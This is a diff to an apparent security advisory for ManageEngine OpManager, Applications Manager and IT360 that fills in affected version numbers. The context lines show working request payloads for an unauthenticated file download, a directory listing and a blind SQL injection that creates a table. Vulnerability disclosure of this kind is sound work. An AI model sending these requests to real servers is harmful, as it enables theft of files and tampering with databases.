@@ -20,7 +20,7 @@ There are definitely more vulnerabilities than the ones identified below - for e
 Vulnerability: Arbitrary file download
 CVE-2014-7863
 Constraints: unauthenticated in OpManager and AppManager; authenticated in IT360
-Affected versions: ManageEngine Applications Manager v? to v11.Y bXXXX; ManageEngine OpManager v8 - v11.Y bXXXXX; IT360 v? to v10.5
+Affected versions: ManageEngine Applications Manager v? to v11.9 b11911; ManageEngine OpManager v8 - v11.5; IT360 v? to v10.5
 
 POST /servlet/FailOverHelperServlet?operation=copyfile&fileName=C:\\boot.ini
 
@@ -29,7 +29,7 @@ POST /servlet/FailOverHelperServlet?operation=copyfile&fileName=C:\\boot.ini
 Vulnerability: Information disclosure - list all files in a directory and its children
 CVE-2014-7863 (same as #1)
 Constraints: unauthenticated in OpManager and AppManager; authenticated in IT360
-Affected versions: ManageEngine Applications Manager v? to v11.Y bXXXX; ManageEngine OpManager v8 - v11.Y bXXXXX; IT360 v? to v10.5
+Affected versions: ManageEngine Applications Manager v? to v11.9 b11911; ManageEngine OpManager v8 - v11.5; IT360 v? to v10.5
 
 POST /servlet/FailOverHelperServlet?operation=listdirectory&rootDirectory=C:\\
 
@@ -37,7 +37,7 @@ POST /servlet/FailOverHelperServlet?operation=listdirectory&rootDirectory=C:\\
 #3
 Vulnerability: Blind SQL injection
 CVE-2014-7864
-Affected versions: ManageEngine OpManager v8 - v11.Y bXXXXX; IT360 v? to v10.5
+Affected versions: ManageEngine OpManager v8 - v11.5; IT360 v? to v10.5
 Constraints: unauthenticated in OpManager; authenticated in IT360
 POST /servlet/com.adventnet.me.opmanager.servlet.FailOverHelperServlet?operation=standbyUpdateInCentral&customerName=[SQLi_1]&serverRole=[SQLi_2]
 POST /servlet/com.adventnet.me.opmanager.servlet.FailOverHelperServlet?operation=standbyUpdateInCentral&customerName=a')%3b+create+table+bacas+(bodas+text)%3b--+&serverRole=a
